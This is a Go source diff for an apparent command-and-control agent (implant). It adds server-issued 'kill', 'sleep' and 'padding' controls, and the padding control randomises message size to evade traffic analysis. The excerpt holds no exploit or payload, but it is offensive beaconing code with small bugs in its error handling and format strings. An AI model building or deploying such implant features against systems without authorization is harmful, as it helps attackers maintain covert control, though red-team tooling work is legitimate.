@@ -12,6 +12,7 @@ import (
 	"flag"
 	"runtime"
 	"math/rand"
+	"strconv"
 
 	"github.com/fatih/color"
 	"github.com/satori/go.uuid"
@@ -168,9 +169,6 @@ func statusCheckIn(host string, client *http.Client) {
 	}
 
 	if resp.ContentLength != 0 {
-		//var j messages.Base
-		//json.NewDecoder(resp.Body).Decode(&j)
-		//http://eagain.net/articles/go-dynamic-json/
 		var payload json.RawMessage
 		j := messages.Base{
 			Payload: &payload,
@@ -224,11 +222,39 @@ func statusCheckIn(host string, client *http.Client) {
 			var p messages.AgentControl
 			json.Unmarshal(payload, &p)
 
-			if p.Command == "kill" {
+			switch p.Command {
+			case "kill":
 				if VERBOSE {
 					color.Yellow("[-]Received Agent Kill Message")
 				}
 				os.Exit(0)
+			case "sleep":
+				if VERBOSE {
+					color.Yellow("[-]Setting agent sleep time to %s milliseconds", p.Args)
+				}
+				t, err := time.ParseDuration(p.Args)
+				if err != nil {
+					if VERBOSE {
+						color.Red("[!]There was an error changing the agent waitTime")
+						color.Red(err.Error())
+					}
+				}
+				waitTime = t
+			case "padding":
+				if VERBOSE {
+					color.Yellow("[-]Setting agent message maximum padding size to %d", p.Args)
+				}
+				t, err := strconv.Atoi(p.Args)
+				if err != nil {
+					if VERBOSE {
+						color.Red("[!]There was an error changing the agent message padding size")
+					}
+				}
+				paddingMax = t
+			default:
+				if VERBOSE {
+					color.Red("[!}Unknown AgentControl message type received %s", p.Command)
+				}
 			}
 		default:
 			color.Red("Received unrecognized message type: %s", j.Type)
@@ -320,5 +346,4 @@ func RandStringBytesMaskImprSrc(n int) string {
 */
 
 // TODO add cert stapling
-// TODO add random sized data to keep the overall message size from being constant
 // TODO add exit after X number of failed logins
